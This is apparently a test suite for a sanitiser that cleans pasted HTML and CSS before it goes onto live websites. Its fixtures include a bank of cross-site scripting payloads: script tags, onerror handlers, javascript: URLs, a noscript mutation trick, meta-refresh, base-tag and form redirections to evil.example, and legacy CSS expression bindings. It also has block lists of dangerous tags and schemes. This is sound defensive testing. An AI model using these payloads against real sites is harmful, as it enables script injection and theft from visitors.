/**
 * Importing somebody else's design.
 *
 * THIS IS THE MOST HOSTILE INPUT IN THE PRODUCT. Everywhere else the text
 * arriving at a sanitiser came out of our own editor, from somebody who signed
 * in. Here a client pastes a whole document from a tool we do not control, and
 * whatever survives goes onto a live website. So the suite is built around two
 * invariants rather than a list of examples, because a list only ever covers
 * the attacks somebody thought of:
 *
 *   1. NOTHING EXECUTABLE SURVIVES. Every hostile fixture is run through the
 *      cleaner and the OUTPUT is checked for the whole family at once: script
 *      tags, event handlers, javascript: URLs. A new payload shape that gets
 *      past a specific assertion still has to get past this one.
 *
 *   2. NOTHING ESCAPES THE SCOPE. Every selector the CSS half emits is re-read
 *      with postcss and checked to start with the scope selector. This is the
 *      property that lets us put a stranger's stylesheet on a page that also
 *      carries ours, and it is checked structurally rather than by example.
 *
 * The third group is fidelity, and it is not a lesser concern: an importer that
 * is perfectly safe and throws away half the design is one nobody uses. The
 * Tailwind class names have their own tests because the first version of the
 * class filter silently deleted every one of them, which would have made every
 * Relume import arrive unstyled with nothing in the log to say why.
 */

import { parseFragment } from 'parse5';
import { parse } from 'postcss';
import { describe, expect, it } from 'vitest';

import { cleanImportHtml, safeImportUrl } from '../lib/import/html';
import {
  importScopeClass,
  scopeImportCss,
  scopeSelectorPart,
  splitSelectorList,
} from '../lib/import/css';

const SCOPE = '.tgi-test';

// ---------------------------------------------------------------------------
// The two invariants, as helpers
// ---------------------------------------------------------------------------

interface Parsed {
  nodeName: string;
  attrs?: { name: string; value: string }[];
  childNodes?: Parsed[];
}

/** Every element in a fragment, at any depth. */
function elementsOf(html: string): Parsed[] {
  const found: Parsed[] = [];
  const walk = (nodes?: Parsed[]) => {
    for (const node of nodes ?? []) {
      if (!node.nodeName.startsWith('#')) found.push(node);
      walk(node.childNodes);
    }
  };
  walk(parseFragment(html).childNodes as unknown as Parsed[]);
  return found;
}

/** Class names as the BROWSER will see them, entities already decoded. */
function classesOf(html: string): string[] {
  return elementsOf(html).flatMap((element) =>
    (element.attrs ?? [])
      .filter((attr) => attr.name === 'class')
      .flatMap((attr) => attr.value.split(/\s+/).filter(Boolean)),
  );
}

/**
 * Printable ASCII only.
 *
 * A URL scheme can be broken up with control characters and exotic spaces that
 * a browser ignores, so the check has to see the value the way the browser
 * would. Written as a loop rather than a character class for the reason
 * lib/import/html.ts states at length: a control-character range in a regex is
 * how a literal control byte ends up in a source file.
 */
function condense(value: string): string {
  let out = '';
  for (const ch of value) {
    const code = ch.charCodeAt(0);
    if (code > 0x20 && code < 0x7f) out += ch;
  }
  return out.toLowerCase();
}

/**
 * Nothing executable survived.
 *
 * READ BACK THROUGH THE PARSER rather than grepped, because grepping the output
 * string answers the wrong question twice over. It false-positives on escaped
 * text, where `title="a&quot; onclick=&quot;x"` is one perfectly inert
 * attribute that contains the letters of another. And it would miss a handler
 * written in a shape the pattern did not expect. What matters is what a browser
 * ends up holding, so the check parses the output exactly as a browser would
 * and looks at the elements and attributes it actually produced.
 *
 * The raw checks that remain cannot false-positive: a real tag needs a literal
 * `<`, and escaped text carries `&lt;` instead.
 */
function assertInert(html: string): void {
  const lower = html.toLowerCase();
  for (const tag of ['<script', '<iframe', '<style', '<form', '<input', '<object', '<embed', '<link', '<meta', '<base', '<noscript']) {
    expect(lower, `output contains ${tag}`).not.toContain(tag);
  }

  for (const element of elementsOf(html)) {
    for (const attr of element.attrs ?? []) {
      const name = attr.name.toLowerCase();
      expect(name.startsWith('on'), `${name} survived on <${element.nodeName}>`).toBe(false);
      expect(name, 'a style attribute survived').not.toBe('style');
      expect(name, 'an id survived').not.toBe('id');

      const value = condense(attr.value ?? '');
      expect(value, `${name} carries a script URL`).not.toContain('javascript:');
      expect(value, `${name} carries a script URL`).not.toContain('vbscript:');
      expect(value, `${name} carries a document data URL`).not.toContain('data:text/html');
      expect(value, `${name} carries an SVG data URL`).not.toContain('data:image/svg');
    }
  }
}

/** Every selector in a stylesheet, paired with whether it is a top-level one. */
function selectorsOf(css: string): { selector: string; scoped: boolean }[] {
  const found: { selector: string; scoped: boolean }[] = [];
  const root = parse(css);

  const walk = (container: { nodes?: unknown[] }, insideRule: boolean, insideKeyframes: boolean) => {
    for (const raw of (container.nodes ?? []) as {
      type: string;
      selector?: string;
      name?: string;
      nodes?: unknown[];
    }[]) {
      if (raw.type === 'rule') {
        found.push({ selector: raw.selector ?? '', scoped: !insideRule && !insideKeyframes });
        walk(raw, true, insideKeyframes);
      } else if (raw.type === 'atrule') {
        const keyframes = (raw.name ?? '').toLowerCase().endsWith('keyframes');
        walk(raw, insideRule, insideKeyframes || keyframes);
      }
    }
  };

  walk(root, false, false);
  return found;
}

/**
 * The containment invariant.
 *
 * Re-reads the emitted CSS and insists every top-level selector part begins
 * with the scope. A part that does not is a rule that can reach the rest of the
 * page, which is the one failure this whole module exists to prevent.
 */
function assertConfined(css: string, scope: string): void {
  for (const { selector, scoped } of selectorsOf(css)) {
    if (!scoped) continue;
    for (const part of splitSelectorList(selector)) {
      const trimmed = part.trim();
      if (!trimmed) continue;
      expect(trimmed.startsWith(scope), `selector escaped the scope: ${trimmed}`).toBe(true);
    }
  }
}

// ---------------------------------------------------------------------------
// URLs
// ---------------------------------------------------------------------------

describe('safeImportUrl', () => {
  it('keeps the ordinary shapes a design uses', () => {
    expect(safeImportUrl('https://example.com/a.png')).toBe('https://example.com/a.png');
    expect(safeImportUrl('http://example.com')).toBe('http://example.com');
    expect(safeImportUrl('/about')).toBe('/about');
    expect(safeImportUrl('images/hero.jpg')).toBe('images/hero.jpg');
    expect(safeImportUrl('#features')).toBe('#features');
    expect(safeImportUrl('mailto:hello@example.com')).toBe('mailto:hello@example.com');
    expect(safeImportUrl('tel:+441234567890')).toBe('tel:+441234567890');
  });

  it('refuses the schemes that run code', () => {
    expect(safeImportUrl('javascript:alert(1)')).toBeNull();
    expect(safeImportUrl('JaVaScRiPt:alert(1)')).toBeNull();
    expect(safeImportUrl('vbscript:msgbox')).toBeNull();
    expect(safeImportUrl('file:///etc/passwd')).toBeNull();
  });

  /*
   * THE OLDEST TRICK, and the reason the value is tidied before the scheme is
   * read. A browser ignores control characters and whitespace inside a scheme,
   * so every one of these navigates to javascript: while a naive startsWith
   * check sees something else entirely.
   */
  it('refuses a scheme broken up with whitespace and control characters', () => {
    const tab = String.fromCharCode(9);
    const newline = String.fromCharCode(10);
    const nul = String.fromCharCode(0);

    expect(safeImportUrl(`java${newline}script:alert(1)`)).toBeNull();
    expect(safeImportUrl(`java${tab}script:alert(1)`)).toBeNull();
    expect(safeImportUrl(`java${nul}script:alert(1)`)).toBeNull();
    expect(safeImportUrl(' javascript:alert(1)')).toBeNull();
    expect(safeImportUrl('java script:alert(1)')).toBeNull();
    // A non-breaking space and a zero-width joiner, which read as nothing.
    expect(safeImportUrl(`java${String.fromCharCode(0x00a0)}script:alert(1)`)).toBeNull();
    expect(safeImportUrl(`java${String.fromCharCode(0x200d)}script:alert(1)`)).toBeNull();
  });

  it('allows raster data URLs and refuses SVG ones', () => {
    expect(safeImportUrl('data:image/png;base64,iVBORw0KGgo=')).toBe(
      'data:image/png;base64,iVBORw0KGgo=',
    );
    // An SVG data URL is a document, and a document can carry script.
    expect(safeImportUrl('data:image/svg+xml;base64,PHN2Zz4=')).toBeNull();
    expect(safeImportUrl('data:text/html,<script>alert(1)</script>')).toBeNull();
  });

  /*
   * A scheme is only a scheme at the very start. Refusing anywhere would throw
   * away a perfectly ordinary tracking link, which is most of the outbound
   * links on a travel site.
   */
  it('does not mistake a scheme in a query string for the URL scheme', () => {
    expect(safeImportUrl('/go?to=javascript:alert(1)')).toBe('/go?to=javascript:alert(1)');
  });

  it('refuses what is not a string, and what is absurdly long', () => {
    expect(safeImportUrl(null)).toBeNull();
    expect(safeImportUrl(undefined)).toBeNull();
    expect(safeImportUrl(42)).toBeNull();
    expect(safeImportUrl('')).toBeNull();
    expect(safeImportUrl(`https://example.com/${'a'.repeat(5000)}`)).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// HTML: what survives
// ---------------------------------------------------------------------------

describe('cleanImportHtml keeps the design', () => {
  it('keeps structure, which is what a design is', () => {
    const { html } = cleanImportHtml(
      '<section class="hero"><div class="container"><h1>Escape to Crete</h1>' +
        '<p>Seven nights, half board.</p></div></section>',
    );

    expect(html).toContain('<section class="hero">');
    expect(html).toContain('<div class="container">');
    expect(html).toContain('<h1>Escape to Crete</h1>');
    expect(html).toContain('</section>');
  });

  /*
   * THE TEST THAT CAUGHT A SILENT DESIGN-DELETING BUG. The class filter used to
   * require a plain CSS identifier, which every one of these fails. A Relume
   * export is Tailwind, so the importer would have stripped nearly every class
   * on the page, leaving a stylesheet full of rules with nothing to match and
   * no error anywhere to say what had happened.
   */
  it('keeps Tailwind class names, which are not CSS identifiers', () => {
    const classes = 'md:flex w-1/2 p-[10px] hover:bg-red-500 text-black/50 [&>*]:mt-2 2xl:grid-cols-3 !font-bold space-y-1.5';
    const { html } = cleanImportHtml(`<div class="${classes}">x</div>`);

    /*
     * Read back through the parser, not matched against the output string.
     * `[&>*]:mt-2` is written out as `[&amp;&gt;*]:mt-2`, which is the same
     * class name correctly escaped: the browser decodes it before it ever
     * reaches the class list. Asserting on the raw string would have failed a
     * working importer and, worse, would have invited somebody to "fix" it by
     * loosening the escaping.
     */
    const kept = classesOf(html);
    for (const name of classes.split(' ')) {
      expect(kept, `lost the class ${name}`).toContain(name);
    }
  });

  it('keeps inline SVG, which is how every icon in a modern export arrives', () => {
    const { html } = cleanImportHtml(
      '<svg viewBox="0 0 24 24" fill="none"><path d="M4 12h16" stroke="currentColor" /></svg>',
    );

    expect(html).toContain('<svg');
    expect(html).toContain('<path');
    expect(html).toContain('d="M4 12h16"');
  });

  it('keeps tables, and lets the parser insert the tbody the markup left out', () => {
    const { html } = cleanImportHtml('<table><tr><td>Crete</td></tr></table>');

    expect(html).toContain('<table>');
    expect(html).toContain('<tbody>');
    expect(html).toContain('<td>Crete</td>');
  });

  /*
   * A tag we have no opinion about is almost always a custom element or
   * something new. Losing the wrapper costs some layout; losing the words costs
   * the page, so the content comes up a level rather than going in the bin.
   */
  it('unwraps an unknown tag and keeps what was inside it', () => {
    const { html, removed } = cleanImportHtml('<my-widget><p>Kept</p></my-widget>');

    expect(html).toBe('<p>Kept</p>');
    expect(removed).toContain('<my-widget>');
  });

  it('adds rel to any link that opens a new tab, asked for or not', () => {
    const { html } = cleanImportHtml('<a href="https://example.com" target="_blank">Book</a>');

    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it('keeps aria attributes, which are most of a design\'s accessibility', () => {
    const { html } = cleanImportHtml('<div role="tablist" aria-label="Destinations"></div>');

    expect(html).toContain('role="tablist"');
    expect(html).toContain('aria-label="Destinations"');
  });

  it('filters a srcset a candidate at a time rather than all or nothing', () => {
    const { html } = cleanImportHtml(
      '<img src="a.png" srcset="a.png 1x, javascript:alert(1) 2x, b.png 800w" />',
    );

    expect(html).toContain('a.png 1x');
    expect(html).toContain('b.png 800w');
    expect(html).not.toContain('javascript');
  });
});

// ---------------------------------------------------------------------------
// HTML: what does not survive
// ---------------------------------------------------------------------------

describe('cleanImportHtml refuses what runs', () => {
  /*
   * A BANK OF PAYLOADS RUN THROUGH ONE INVARIANT. Adding a shape here is the
   * cheapest test in the suite, and the assertion does not need to know which
   * shape it caught.
   */
  const HOSTILE: [string, string][] = [
    ['a plain script tag', '<div><script>alert(1)</script></div>'],
    ['a script with an attribute', '<script src="https://evil.example/x.js"></script>'],
    ['an inline handler', '<div onclick="alert(1)">x</div>'],
    ['a shouted inline handler', '<div ONCLICK="alert(1)">x</div>'],
    ['an error handler on a broken image', '<img src="x" onerror="alert(1)" />'],
    ['a handler nobody has invented yet', '<div onwhateverisnext="alert(1)">x</div>'],
    ['a javascript href', '<a href="javascript:alert(1)">x</a>'],
    ['a javascript href split by a newline', '<a href="java\nscript:alert(1)">x</a>'],
    ['a form that posts somewhere', '<form action="https://evil.example"><input name="p" /></form>'],
    ['an iframe', '<iframe src="https://evil.example"></iframe>'],
    ['an object', '<object data="x.swf"></object>'],
    ['an embedded style block', '<style>body{background:url(javascript:alert(1))}</style>'],
    ['a style attribute', '<div style="background:url(javascript:alert(1))">x</div>'],
    ['an svg with a script inside', '<svg><script>alert(1)</script></svg>'],
    ['an svg with a style inside', '<svg><style><img src=x onerror=alert(1)></style></svg>'],
    ['an svg animate handler', '<svg><a><animate attributeName="href" values="javascript:alert(1)" /></a></svg>'],
    [
      'the noscript mutation payload',
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
    ],
    ['a comment that closes early', '<!--><img src=x onerror=alert(1)>-->'],
    ['an unclosed tag before a payload', '<div><p><img src=x onerror=alert(1)>'],
    ['a base tag that reroutes every relative link', '<base href="https://evil.example/" />'],
    ['a meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example" />'],
    ['a stylesheet link', '<link rel="stylesheet" href="https://evil.example/x.css" />'],
    ['a data URL document', '<a href="data:text/html,<script>alert(1)</script>">x</a>'],
    ['an svg data URL image', '<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Pg==" />'],
  ];

  for (const [label, payload] of HOSTILE) {
    it(`neutralises ${label}`, () => {
      assertInert(cleanImportHtml(payload).html);
    });
  }

  /*
   * THE DIFFERENCE THAT MATTERS MOST IN THIS FILE. An unknown tag yields its
   * words, because the words are the design. A script must take its body with
   * it, or the cleaner removes the tag and leaves the source of the program
   * sitting in the page as text, ready for the next thing that puts it back
   * inside one.
   */
  it('drops a script with its body rather than leaving the code as text', () => {
    const { html } = cleanImportHtml('<div><script>var stolen = document.cookie;</script></div>');

    expect(html).toBe('<div></div>');
    expect(html).not.toContain('document.cookie');
  });

  /*
   * Not a security refusal. Unwrapping a form would be perfectly safe, because
   * the <form> goes and its fields post nowhere. What it would leave is a
   * contact form on a client's live site that looks entirely real, that a
   * visitor types their name and their dates into, and that silently does
   * nothing with them.
   */
  it('drops a form with its fields rather than leaving one that goes nowhere', () => {
    const { html } = cleanImportHtml(
      '<form action="https://evil.example"><label>Your name</label>' +
        '<input name="n" /><button>Send</button></form>',
    );

    expect(html).toBe('');
    expect(html).not.toContain('Your name');
    expect(html).not.toContain('Send');
  });

  it('drops a style with its body, so the rules do not become visible text', () => {
    const { html } = cleanImportHtml('<div><style>.a{color:red}</style>Hello</div>');

    expect(html).toBe('<div>Hello</div>');
    expect(html).not.toContain('color:red');
  });

  it('refuses id, because two imports would carry the same ones onto one page', () => {
    const { html } = cleanImportHtml('<div id="hero" class="hero">x</div>');

    expect(html).not.toContain('id=');
    expect(html).toContain('class="hero"');
  });

  it('escapes text rather than trusting it', () => {
    const { html } = cleanImportHtml('<p>5 &lt; 6 &amp; 7 &gt; 6</p>');

    expect(html).toBe('<p>5 &lt; 6 &amp; 7 &gt; 6</p>');
  });

  /*
   * The quote is escaped rather than the value refused, and the difference
   * between "inert" and "absent" is the point. The output still contains the
   * letters o-n-c-l-i-c-k, inside one title attribute, because the quote that
   * was meant to end that attribute early became &quot;. Read back through the
   * parser there is exactly one attribute and no handler.
   */
  it('escapes a quote in an attribute value so it cannot end the attribute', () => {
    const { html } = cleanImportHtml('<div title=\'a" onclick="alert(1)\'>x</div>');

    const [div] = elementsOf(html);
    expect(div.nodeName).toBe('div');
    expect((div.attrs ?? []).map((attr) => attr.name)).toEqual(['title']);
    expect((div.attrs ?? [])[0].value).toBe('a" onclick="alert(1)');
    assertInert(html);
  });

  it('drops comments, which can carry markup a browser will read', () => {
    const { html } = cleanImportHtml('<div><!-- [if IE]><script>alert(1)</script><![endif] --></div>');

    expect(html).toBe('<div></div>');
  });

  it('stops at the depth limit rather than recursing forever', () => {
    const deep = '<div>'.repeat(500) + 'x' + '</div>'.repeat(500);
    const { removed } = cleanImportHtml(deep, { maxDepth: 20 });

    expect(removed).toContain('content nested too deeply');
  });

  it('stops at the element limit rather than accepting a pasted megabyte', () => {
    const wide = '<p>x</p>'.repeat(500);
    const { removed } = cleanImportHtml(wide, { maxElements: 50 });

    expect(removed).toContain('the design was larger than we import in one go');
  });

  it('says what it took out, so the screen is not quietly different', () => {
    const { removed } = cleanImportHtml('<div onclick="x()"><script>y()</script></div>');

    expect(removed).toContain('event handlers');
    expect(removed).toContain('<script>');
  });
});

// ---------------------------------------------------------------------------
// CSS: splitting a selector list
// ---------------------------------------------------------------------------

describe('splitSelectorList', () => {
  it('splits on the commas that separate selectors', () => {
    expect(splitSelectorList('.a, .b, .c').map((s) => s.trim())).toEqual(['.a', '.b', '.c']);
  });

  /*
   * The commas that are NOT separators. Getting these wrong costs a style,
   * never containment: both halves of a bad split still get the scope put in
   * front, and both are syntactically broken, so the browser drops the rule.
   */
  it('does not split inside a functional pseudo-class', () => {
    expect(splitSelectorList('.a:not(.b, .c), .d').map((s) => s.trim())).toEqual([
      '.a:not(.b, .c)',
      '.d',
    ]);
    expect(splitSelectorList(':is(h1, h2) .x').map((s) => s.trim())).toEqual([':is(h1, h2) .x']);
  });

  it('does not split inside an attribute value', () => {
    expect(splitSelectorList('[data-x="a,b"], .c').map((s) => s.trim())).toEqual([
      '[data-x="a,b"]',
      '.c',
    ]);
  });

  it('does not split inside an escaped Tailwind class name', () => {
    expect(splitSelectorList('.grid-cols-\\[1fr\\,2fr\\], .b').map((s) => s.trim())).toEqual([
      '.grid-cols-\\[1fr\\,2fr\\]',
      '.b',
    ]);
  });
});

describe('scopeSelectorPart', () => {
  it('puts the scope in front of an ordinary selector', () => {
    expect(scopeSelectorPart('.card .title', SCOPE)).toBe('.tgi-test .card .title');
  });

  /*
   * :root is where a Tailwind build puts its whole palette. Scoped as a
   * descendant it would be `.tgi-test :root`, which matches nothing, and the
   * design would arrive with every colour undefined. It has to BECOME the scope
   * element, which is also exactly where those properties should be inherited
   * from.
   */
  it('turns the document-level selectors into the scope itself', () => {
    expect(scopeSelectorPart(':root', SCOPE)).toBe('.tgi-test');
    expect(scopeSelectorPart('html', SCOPE)).toBe('.tgi-test');
    expect(scopeSelectorPart('body', SCOPE)).toBe('.tgi-test');
    expect(scopeSelectorPart('body .card', SCOPE)).toBe('.tgi-test .card');
  });

  it('keeps a compound attached when body carries a class of its own', () => {
    expect(scopeSelectorPart('body.dark .card', SCOPE)).toBe('.tgi-test.dark .card');
    expect(scopeSelectorPart(':root:hover', SCOPE)).toBe('.tgi-test:hover');
  });

  it('reads a leading combinator as a child of the scope', () => {
    expect(scopeSelectorPart('> .card', SCOPE)).toBe('.tgi-test > .card');
  });

  it('does not mistake a longer word for a document selector', () => {
    expect(scopeSelectorPart('bodyguard', SCOPE)).toBe('.tgi-test bodyguard');
    expect(scopeSelectorPart('.body', SCOPE)).toBe('.tgi-test .body');
    expect(scopeSelectorPart('html-panel', SCOPE)).toBe('.tgi-test html-panel');
  });

  it('refuses an empty or absurd part', () => {
    expect(scopeSelectorPart('   ', SCOPE)).toBeNull();
    expect(scopeSelectorPart('.a'.repeat(800), SCOPE)).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// CSS: the containment invariant
// ---------------------------------------------------------------------------

describe('scopeImportCss confines everything', () => {
  const ADVERSARIAL = [
    '.a { color: red }',
    'div { color: red }',
    '* { box-sizing: border-box }',
    'html, body, :root { margin: 0 }',
    'a:hover, a:focus-visible { color: blue }',
    '.a:not(.b, .c) .d { color: red }',
    ':is(h1, h2, h3) { margin: 0 }',
    ':where(.a) .b { color: red }',
    '.a:has(> img) { color: red }',
    '[data-x="a,b"] { color: red }',
    '.md\\:flex { display: flex }',
    '.w-1\\/2 { width: 50% }',
    '@media (min-width: 768px) { .a { color: red } body { margin: 0 } }',
    '@supports (display: grid) { .a { display: grid } }',
    '@layer utilities { .a { color: red } }',
    '.a { color: red } .b { color: blue }',
    '::selection { background: yellow }',
    'input::placeholder { color: grey }',
    '.a > .b + .c ~ .d { color: red }',
  ];

  for (const css of ADVERSARIAL) {
    it(`confines ${css.slice(0, 44)}`, () => {
      const { css: out } = scopeImportCss(css, { scope: SCOPE });
      assertConfined(out, SCOPE);
      // And what came out has to be readable CSS, not a broken stylesheet.
      expect(() => parse(out)).not.toThrow();
    });
  }

  it('confines a whole realistic stylesheet in one go', () => {
    const { css: out } = scopeImportCss(
      `:root { --brand: #0a5; --space: 1rem }
       *, ::before, ::after { box-sizing: border-box }
       body { margin: 0; font-family: Inter, sans-serif }
       .header { display: flex; gap: var(--space) }
       .header__nav a, .header__nav a:hover { color: var(--brand) }
       @media (min-width: 62rem) {
         .header { padding: 2rem }
         body { font-size: 18px }
       }`,
      { scope: SCOPE },
    );

    assertConfined(out, SCOPE);
    // The palette survived, and landed somewhere it can be inherited from.
    expect(out).toContain('--brand: #0a5');
    expect(out).toMatch(/\.tgi-test\s*\{[^}]*--brand/);
  });
});

// ---------------------------------------------------------------------------
// CSS: what does not survive
// ---------------------------------------------------------------------------

describe('scopeImportCss refuses what runs or reaches out', () => {
  it('refuses @import, which fetches a stylesheet we cannot see the far end of', () => {
    const { css, removed } = scopeImportCss('@import url("https://evil.example/x.css"); .a{color:red}', {
      scope: SCOPE,
    });

    expect(css).not.toContain('@import');
    expect(removed.join(' ')).toContain('@import');
    expect(css).toContain('.tgi-test .a');
  });

  /*
   * @font-face is not a security refusal, it is a product one. This whole
   * project downloads and self-hosts every font on purpose, which is what
   * lib/fonts/preview.ts and the font-preview route exist for. An imported face
   * would put the visitor's browser straight back on somebody else's origin.
   */
  it('refuses @font-face and says where fonts belong instead', () => {
    const { css, removed } = scopeImportCss(
      '@font-face { font-family: X; src: url(https://fonts.gstatic.com/x.woff2) }',
      { scope: SCOPE },
    );

    expect(css).not.toContain('@font-face');
    expect(removed.join(' ')).toContain('Theme');
  });

  const DANGEROUS = [
    ['an IE expression', '.a { width: expression(alert(1)) }'],
    ['a Mozilla binding', '.a { -moz-binding: url("x.xml#y") }'],
    ['an IE behaviour', '.a { behavior: url(script.htc) }'],
    ['an IE filter', '.a { filter: progid:DXImageTransform.Microsoft.gradient() }'],
    ['a javascript background', '.a { background: url(javascript:alert(1)) }'],
    ['an SVG data URL background', '.a { background: url(data:image/svg+xml;base64,PHN2Zz4=) }'],
    ['a bare string in image-set', '.a { background: image-set("javascript:alert(1)" 1x) }'],
    ['a malformed url call', '.a { background: url(javascript:alert(1) }'],
  ];

  for (const [label, css] of DANGEROUS) {
    it(`refuses ${label}`, () => {
      const { css: out } = scopeImportCss(css, { scope: SCOPE });

      expect(out.toLowerCase()).not.toContain('javascript:');
      expect(out.toLowerCase()).not.toContain('expression(');
      expect(out.toLowerCase()).not.toContain('-moz-binding');
      expect(out.toLowerCase()).not.toContain('progid:');
      expect(out.toLowerCase()).not.toContain('behavior:');
      expect(out.toLowerCase()).not.toContain('data:image/svg');
    });
  }

  it('keeps a raster data URL, which is how a small design ships its own icons', () => {
    const { css } = scopeImportCss('.a { background: url(data:image/png;base64,iVBORw0KGgo=) }', {
      scope: SCOPE,
    });

    expect(css).toContain('data:image/png;base64,iVBORw0KGgo=');
  });

  it('keeps an ordinary image URL and quotes it on the way out', () => {
    const { css } = scopeImportCss('.a { background: url(images/hero.jpg) no-repeat }', {
      scope: SCOPE,
    });

    expect(css).toContain('url("images/hero.jpg")');
    expect(css).toContain('no-repeat');
  });

  /*
   * A fixed element is positioned against the viewport, so it leaves the
   * section entirely. An imported overlay with inset:0 would cover the editor
   * chrome and the client would have no way to click their way back out of the
   * design they had just added.
   */
  it('downgrades fixed positioning and leaves sticky alone', () => {
    const fixed = scopeImportCss('.a { position: fixed; inset: 0 }', { scope: SCOPE });
    expect(fixed.css).toContain('position: absolute');
    expect(fixed.removed).toContain('fixed positioning');

    const sticky = scopeImportCss('.a { position: sticky; top: 0 }', { scope: SCOPE });
    expect(sticky.css).toContain('position: sticky');
  });

  /*
   * The URLs are lifted out of a value and replaced with placeholders so the
   * dangerous-value check can run on what is left. A design that contains the
   * placeholder text itself would have a real URL substituted in where it asked
   * for words, so the whole declaration goes.
   *
   * The test needs a real url() IN THE SAME DECLARATION to mean anything: with
   * the placeholder alone the substitution has nothing to put there and the
   * output is harmless either way, which is how the first version of this test
   * passed with the guard deleted.
   */
  it('refuses a value carrying our own URL placeholder', () => {
    const { css } = scopeImportCss('.a { background: url(/real.png) #TGURL0# }', { scope: SCOPE });

    expect(css).not.toContain('#TGURL');
    expect(css).not.toContain('/real.png');
  });

  it('drops comments and empty rules rather than emitting furniture', () => {
    const { css } = scopeImportCss('/* a note */ .a { behavior: url(x.htc) } .b { color: red }', {
      scope: SCOPE,
    });

    expect(css).not.toContain('a note');
    // .a lost its only declaration, so it should not be an empty pair of braces.
    expect(css).not.toContain('.tgi-test .a');
    expect(css).toContain('.tgi-test .b');
  });

  it('refuses a stylesheet too large to be a design', () => {
    const huge = '.a{color:red}'.repeat(50_000);
    const { css, removed } = scopeImportCss(huge, { scope: SCOPE, maxBytes: 1000 });

    expect(css).toBe('');
    expect(removed).toContain('the stylesheet was too large to import');
  });

  it('stops at the rule limit', () => {
    const many = Array.from({ length: 200 }, (_, i) => `.c${i}{color:red}`).join('');
    const { removed } = scopeImportCss(many, { scope: SCOPE, maxRules: 20 });

    expect(removed).toContain('the design had more styles than we import in one go');
  });

  it('survives a stylesheet it cannot read at all', () => {
    const { css } = scopeImportCss('.a { color: red', { scope: SCOPE });

    // postcss is forgiving, so this either parses or is refused. Either way the
    // caller gets a string and nothing throws.
    expect(typeof css).toBe('string');
    assertConfined(css, SCOPE);
  });

  it('does nothing with an empty stylesheet', () => {
    expect(scopeImportCss('', { scope: SCOPE }).css).toBe('');
    expect(scopeImportCss('   ', { scope: SCOPE }).css).toBe('');
  });
});

// ---------------------------------------------------------------------------
// CSS: fidelity
// ---------------------------------------------------------------------------

describe('scopeImportCss keeps the design working', () => {
  /*
   * @layer is UNWRAPPED, and this is a fidelity fix rather than a safety one. A
   * layered rule loses to an unlayered one no matter how specific it is, and
   * our own page CSS is unlayered. A Tailwind build puts nearly everything it
   * emits inside @layer, so keeping the wrapper would mean an import arriving
   * with our defaults winning every argument it was never meant to be in.
   */
  it('unwraps @layer so our unlayered CSS does not beat the import', () => {
    const { css } = scopeImportCss(
      '@layer theme, base, utilities; @layer utilities { .mt-2 { margin-top: 0.5rem } }',
      { scope: SCOPE },
    );

    expect(css).not.toContain('@layer');
    expect(css).toContain('.tgi-test .mt-2');
    assertConfined(css, SCOPE);
  });

  it('keeps @media and @supports and scopes what is inside them', () => {
    const { css } = scopeImportCss(
      '@media (min-width: 48rem) { .a { display: flex } } @supports (display:grid) { .b { display: grid } }',
      { scope: SCOPE },
    );

    expect(css).toContain('@media (min-width: 48rem)');
    expect(css).toContain('@supports (display:grid)');
    expect(css).toContain('.tgi-test .a');
    expect(css).toContain('.tgi-test .b');
  });

  /*
   * Two imports both defining `fade` would have the second overwrite the first,
   * because keyframe names are global to the document however well the
   * selectors are scoped.
   */
  it('renames keyframes and repoints the animations at the new name', () => {
    const { css } = scopeImportCss(
      '@keyframes fade { from { opacity: 0 } to { opacity: 1 } } .a { animation: fade 1s ease-in }',
      { scope: SCOPE },
    );

    expect(css).toContain('@keyframes fade-tgi-test');
    expect(css).toContain('animation: fade-tgi-test 1s ease-in');
    expect(css).not.toMatch(/animation:\s*fade\s/);
  });

  /*
   * TWO PASSES, AND THIS IS WHY. In a minified export the animation is usually
   * declared above the @keyframes it names, so a single pass would rename the
   * block and leave every reference to it pointing at a name that no longer
   * exists. Silently: the rule stays valid, the animation just never runs.
   */
  it('repoints an animation declared before its keyframes', () => {
    const { css } = scopeImportCss(
      '.a { animation-name: slide } @keyframes slide { to { left: 0 } }',
      { scope: SCOPE },
    );

    expect(css).toContain('animation-name: slide-tgi-test');
    expect(css).toContain('@keyframes slide-tgi-test');
  });

  it('leaves the steps inside a keyframes block alone', () => {
    const { css } = scopeImportCss('@keyframes fade { from { opacity: 0 } 50% { opacity: .5 } }', {
      scope: SCOPE,
    });

    expect(css).toContain('from {');
    expect(css).toContain('50% {');
    expect(css).not.toContain('.tgi-test from');
    expect(css).not.toContain('.tgi-test 50%');
  });

  /*
   * ASSERTED AS THE EXACT SELECTOR LIST, not with toContain. A nested rule that
   * had wrongly been scoped reads `.tgi-test &:hover`, which still contains
   * `&:hover` and still does not contain `.tgi-test .tgi-test`, so the obvious
   * pair of substring checks passes while the output is wrong. Found by
   * deliberately breaking the nesting flag and watching the test stay green.
   */
  it('does not scope a nested rule twice', () => {
    const { css } = scopeImportCss('.a { color: red; &:hover { color: blue } }', { scope: SCOPE });

    expect(selectorsOf(css)).toEqual([
      { selector: '.tgi-test .a', scoped: true },
      { selector: '&:hover', scoped: false },
    ]);
  });

  it('keeps a vendor-prefixed keyframes block', () => {
    const { css } = scopeImportCss('@-webkit-keyframes fade { to { opacity: 1 } }', { scope: SCOPE });

    expect(css).toContain('@-webkit-keyframes fade-tgi-test');
  });
});

// ---------------------------------------------------------------------------
// The scope class
// ---------------------------------------------------------------------------

describe('importScopeClass', () => {
  it('builds one class from an id', () => {
    expect(importScopeClass('a1b2c3')).toBe('tgi-a1b2c3');
  });

  /*
   * The id reaches this from stored content, and a class name goes straight
   * into a class attribute and into a selector. Anything that is not plain
   * identifier material is removed rather than escaped, because nothing needs
   * it and an escaped name has to be un-escaped identically in two places.
   */
  it('strips anything that is not identifier material', () => {
    expect(importScopeClass('a b"c<>&')).toBe('tgi-abc');
    expect(importScopeClass('../../etc')).toBe('tgi-etc');
    expect(importScopeClass('')).toBe('tgi-x');
    expect(importScopeClass('!!!')).toBe('tgi-x');
  });

  it('never grows without limit', () => {
    expect(importScopeClass('a'.repeat(500)).length).toBeLessThan(50);
  });
});

// ---------------------------------------------------------------------------
// The two halves together
// ---------------------------------------------------------------------------

